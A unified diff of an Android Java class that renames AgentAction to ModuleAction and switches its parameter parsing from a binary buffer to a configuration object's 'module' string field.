@@ -11,7 +11,11 @@ package com.android.service.action;
 
 import java.io.IOException;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
@@ -19,36 +23,33 @@ import com.android.service.util.DataBuffer;
 /**
  * The Class StopAgentAction.
  */
-public abstract class AgentAction extends SubAction {
+abstract class ModuleAction extends SubAction {
 	private static final String TAG = "AgentAction"; //$NON-NLS-1$
 
-	protected int agentId;
+	protected String moduleId;
 
 	/**
 	 * Instantiates a new stop agent action.
 	 * 
-	 * @param type
-	 *            the type
-	 * @param confParams
+	 * @param jsubaction
 	 *            the conf params
 	 */
-	public AgentAction(final int type, final byte[] confParams) {
-		super(type, confParams);
+	public ModuleAction( final ActionConf jsubaction) {
+		super( jsubaction);
 	}
 
 	@Override
-	protected boolean parse(byte[] params) {
-		final DataBuffer databuffer = new DataBuffer(params, 0, params.length);
+	protected boolean parse(ActionConf params) {
+		
 		try {
-			agentId = databuffer.readInt();
-
-		} catch (final IOException e) {
+			this.moduleId=params.getString("module");
+		} catch (ConfigurationException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parse) Error: " + e.toString()) ;//$NON-NLS-1$
+				Check.log(TAG + " (parse) Error: " + e);
 			}
 			return false;
 		}
-
+		
 		return true;
 	}
 
